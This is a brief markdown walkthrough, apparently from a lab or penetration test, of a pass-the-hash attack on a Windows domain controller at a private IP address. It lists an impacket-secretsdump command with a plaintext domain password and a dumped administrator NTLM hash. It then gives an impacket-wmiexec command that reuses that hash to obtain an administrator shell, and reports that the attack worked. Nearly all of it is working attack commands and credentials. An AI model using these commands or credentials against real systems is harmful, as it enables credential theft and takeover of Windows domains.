# Pass-the-Hash Attack

## Secrets Dump

`impacket-secretsdump corp.local/j.smith:Welcome1@192.168.91.129`


## Administrator Hash

1879a8e6d9ab6426b63e5890229468ec

## Pass-the-Hash command:

Another method: 
`impacket-wmiexec administrator@192.168.91.129 -hashes aad3b435b51404eeaad3b435b51404ee:1879a8e6d9ab6426b63e5890229468ec`

## Success

The WMIEXEC method worked successfully. We now have a shell as the administrator on the Domain Controller.
